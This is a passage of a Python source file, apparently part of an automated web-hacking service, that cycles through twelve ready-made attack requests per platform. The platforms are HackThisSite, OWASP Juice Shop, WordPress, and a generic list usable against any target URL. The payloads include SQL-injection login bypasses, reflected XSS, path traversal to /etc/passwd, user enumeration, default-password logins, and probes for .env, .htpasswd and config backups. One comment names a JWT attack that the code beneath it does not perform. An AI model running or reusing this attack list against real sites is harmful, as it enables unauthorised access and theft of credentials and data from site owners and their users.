        "- SQL Injection login: email=' OR 1=1--, password=x\n"
        "- SQL Injection alt: email=' OR '1'='1'--, password=x\n"
        "- Juice Shop admin bypass: email=admin@juice-sh.op'--, password=x\n"
        "- XSS: <script>alert(1)</script>\n"
        "- LFI: ../../etc/passwd\n"
        "- Common endpoints: /rest/user/login, /api/login, /login, /admin\n"
        f"- Tech detected: {tech}"
    )


def _rule_based_payload(state: dict, attempt: int) -> dict:
    """Web Hacking Top 12 — 범용 + 플랫폼별 rule-based 공격 순환."""
    parsed = urlparse(state["target_url"])
    base = f"{parsed.scheme}://{parsed.netloc}"
    tech = state.get("detected_tech", "")

    # ── HackThisSite 전용 공격 목록 (미션 페이지 + 정찰 중심) ─────────
    if "HackThisSite" in tech:
        attacks = [
            # 1: Basic Mission 1 — HTML 소스에 password hidden 필드 노출
            {"url": f"{base}/missions/basic/1/", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[1/12] Basic Mission 1: HTML source에 hidden password 노출 여부"},
            # 2: Basic Mission 2 — JavaScript에 평문 비밀번호
            {"url": f"{base}/missions/basic/2/", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[2/12] Basic Mission 2: JS 소스에 평문 password 노출 여부"},
            # 3: Basic Mission 3 — 서버사이드 password 파일 추측
            {"url": f"{base}/missions/basic/3/", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[3/12] Basic Mission 3: 서버 password 파일 추측"},
            # 4: Basic Mission 4 — email injection
            {"url": f"{base}/missions/basic/4/", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[4/12] Basic Mission 4: email injection 취약점 확인"},
            # 5: Basic Mission 5 — .htpasswd / 백업파일 노출
            {"url": f"{base}/missions/basic/5/", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[5/12] Basic Mission 5: 백업파일(.bak) 노출"},
            # 6: robots.txt — 숨겨진 경로 정찰
            {"url": f"{base}/robots.txt", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[6/12] Recon: robots.txt에서 숨겨진 경로 수집"},
            # 7: .htpasswd 노출 시도
            {"url": f"{base}/.htpasswd", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[7/12] .htpasswd 파일 직접 접근"},
            # 8: 백업 파일 — index.php.bak
            {"url": f"{base}/index.php.bak", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[8/12] Backup file: index.php.bak 노출"},
            # 9: 관리자 페이지 직접 접근
            {"url": f"{base}/admin/", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[9/12] Broken Access Control: /admin/ 직접 접근"},
            # 10: Basic Mission 6 — 암호화된 패스워드 역추적
            {"url": f"{base}/missions/basic/6/", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[10/12] Basic Mission 6: 암호화 우회"},
            # 11: LFI — 경로 탐색
            {"url": f"{base}/missions/basic/1/../../../../etc/passwd", "method": "GET",
             "content_type": "json", "data": {}, "explanation": "[11/12] LFI: 미션 경로 탐색 → /etc/passwd"},
            # 12: XSS — 검색 파라미터
            {"url": f"{base}/search/?q=<script>alert(document.domain)</script>",
             "method": "GET", "content_type": "json", "data": {},
             "explanation": "[12/12] XSS Reflected: /search/?q=<script>"},
        ]
        return attacks[(attempt - 1) % len(attacks)]

    # ── Juice Shop 전용 공격 목록 (JSON API) ───────────────────────────
    if "Juice Shop" in tech:
        attacks = [
            # 1~4: SQLi via JSON REST API
            {"url": f"{base}/rest/user/login", "method": "POST", "content_type": "json",
             "data": {"email": "' OR 1=1--", "password": "x"},
             "explanation": "[1/12] SQLi Auth Bypass: /rest/user/login (' OR 1=1--)"},
            {"url": f"{base}/rest/user/login", "method": "POST", "content_type": "json",
             "data": {"email": "' OR true--", "password": "x"},
             "explanation": "[2/12] SQLi Auth Bypass (SQLite): ' OR true--"},
            {"url": f"{base}/rest/user/login", "method": "POST", "content_type": "json",
             "data": {"email": "admin@juice-sh.op'--", "password": "x"},
             "explanation": "[3/12] SQLi: admin email + comment (admin@juice-sh.op'--)"},
            {"url": f"{base}/rest/user/login", "method": "POST", "content_type": "json",
             "data": {"email": "' OR '1'='1'--", "password": "x"},
             "explanation": "[4/12] SQLi: ' OR '1'='1'-- variant"},
            # 5: IDOR — 전체 유저 목록
            {"url": f"{base}/api/Users/", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[5/12] IDOR: /api/Users/ — enumerate all users"},
            # 6: 관리자 패널
            {"url": f"{base}/#/administration", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[6/12] Broken Access Control: /#/administration"},
            # 7: XSS — 검색
            {"url": f"{base}/rest/products/search?q=<script>alert(document.domain)</script>",
             "method": "GET", "content_type": "json", "data": {},
             "explanation": "[7/12] XSS Reflected: search ?q=<script>"},
            # 8: LFI
            {"url": f"{base}/assets/i18n/../../../../etc/passwd",
             "method": "GET", "content_type": "json", "data": {},
             "explanation": "[8/12] LFI: /assets/i18n/../../../../etc/passwd"},
            # 9: UNION SELECT
            {"url": f"{base}/rest/user/login", "method": "POST", "content_type": "json",
             "data": {"email": "' UNION SELECT 1,2,3--", "password": "x"},
             "explanation": "[9/12] SQLi UNION SELECT: column probe"},
            # 10: /api/Feedbacks IDOR
            {"url": f"{base}/api/Feedbacks/", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[10/12] IDOR: /api/Feedbacks/ data dump"},
            # 11: JWT None alg (forged token)
            {"url": f"{base}/rest/user/login", "method": "POST", "content_type": "json",
             "data": {"email": "' OR 1=1 LIMIT 1--", "password": "x"},
             "explanation": "[11/12] SQLi: LIMIT 1 variant (MySQL/SQLite)"},
            # 12: /admin
            {"url": f"{base}/admin", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[12/12] Broken Access Control: /admin direct access"},
        ]
        return attacks[(attempt - 1) % len(attacks)]

    # ── WordPress 전용 공격 목록 ────────────────────────────────────────
    if "WordPress" in tech:
        attacks = [
            {"url": f"{base}/wp-login.php", "method": "POST", "content_type": "form",
             "data": {"log": "admin", "pwd": "' OR 1=1--", "wp-submit": "Log In"},
             "explanation": "[1/12] WordPress SQLi: admin/' OR 1=1--"},
            {"url": f"{base}/wp-login.php", "method": "POST", "content_type": "form",
             "data": {"log": "admin", "pwd": "admin"},
             "explanation": "[2/12] WordPress default: admin/admin"},
            {"url": f"{base}/wp-json/wp/v2/users", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[3/12] WordPress IDOR: /wp-json/wp/v2/users (user enum)"},
            {"url": f"{base}/wp-admin/", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[4/12] WordPress admin panel direct access"},
            {"url": f"{base}/?author=1", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[5/12] WordPress user enumeration: ?author=1"},
            {"url": f"{base}/xmlrpc.php", "method": "POST", "content_type": "form",
             "data": {"xml": "<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"},
             "explanation": "[6/12] WordPress XMLRPC: list methods"},
            {"url": f"{base}/wp-login.php", "method": "POST", "content_type": "form",
             "data": {"log": "' OR 1=1--", "pwd": "x", "wp-submit": "Log In"},
             "explanation": "[7/12] WordPress SQLi in username field"},
            {"url": f"{base}/wp-content/debug.log", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[8/12] WordPress debug.log exposure"},
            {"url": f"{base}/?s=<script>alert(1)</script>", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[9/12] WordPress XSS: search ?s=<script>"},
            {"url": f"{base}/wp-config.php.bak", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[10/12] WordPress config backup file exposure"},
            {"url": f"{base}/wp-login.php", "method": "POST", "content_type": "form",
             "data": {"log": "admin", "pwd": "password"},
             "explanation": "[11/12] WordPress default: admin/password"},
            {"url": f"{base}/.env", "method": "GET", "content_type": "json",
             "data": {}, "explanation": "[12/12] .env file exposure"},
        ]
        return attacks[(attempt - 1) % len(attacks)]

    # ── 범용 공격 목록 (플랫폼 미감지) ────────────────────────────────────
    attacks = [
        # 1~3: 범용 로그인 SQLi
        {"url": f"{base}/login", "method": "POST", "content_type": "form",
         "data": {"username": "' OR 1=1--", "password": "x"},
         "explanation": "[1/12] SQLi Auth Bypass (form): /login username"},
        {"url": f"{base}/login", "method": "POST", "content_type": "json",
         "data": {"email": "' OR 1=1--", "password": "x"},
         "explanation": "[2/12] SQLi Auth Bypass (JSON): /login email"},
        {"url": f"{base}/signin", "method": "POST", "content_type": "json",
         "data": {"email": "' OR true--", "password": "x"},
         "explanation": "[3/12] SQLi Auth Bypass: /signin endpoint"},
        # 4~5: 다른 로그인 경로
        {"url": f"{base}/api/login", "method": "POST", "content_type": "json",
         "data": {"email": "' OR 1=1--", "password": "x"},
         "explanation": "[4/12] SQLi Auth Bypass: /api/login endpoint"},
        {"url": f"{base}/user/login", "method": "POST", "content_type": "form",
         "data": {"username": "' OR 1=1--", "password": "x"},
         "explanation": "[5/12] SQLi Auth Bypass: /user/login (form)"},
        # 6: IDOR
        {"url": f"{base}/api/users", "method": "GET", "content_type": "json",
         "data": {}, "explanation": "[6/12] IDOR: /api/users user enumeration"},
        # 7: admin
        {"url": f"{base}/admin", "method": "GET", "content_type": "json",
         "data": {}, "explanation": "[7/12] Broken Access Control: /admin"},
        # 8: UNION SELECT
        {"url": f"{base}/login", "method": "POST", "content_type": "form",
         "data": {"username": "' UNION SELECT 1,2,3--", "password": "x"},
         "explanation": "[8/12] SQLi UNION SELECT: column probe"},
        # 9: XSS
        {"url": f"{base}/search?q=<script>alert(document.domain)</script>",
         "method": "GET", "content_type": "json", "data": {},
         "explanation": "[9/12] XSS Reflected: search?q=<script>"},
        # 10: LFI
        {"url": f"{base}/file?path=../../etc/passwd", "method": "GET", "content_type": "json",
         "data": {}, "explanation": "[10/12] LFI: path traversal → /etc/passwd"},
        # 11: .env
        {"url": f"{base}/.env", "method": "GET", "content_type": "json",
         "data": {}, "explanation": "[11/12] .env file exposure"},
        # 12: robots.txt 정찰
        {"url": f"{base}/robots.txt", "method": "GET", "content_type": "json",
         "data": {}, "explanation": "[12/12] Recon: robots.txt for hidden paths"},
    ]
    return attacks[(attempt - 1) % len(attacks)]


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
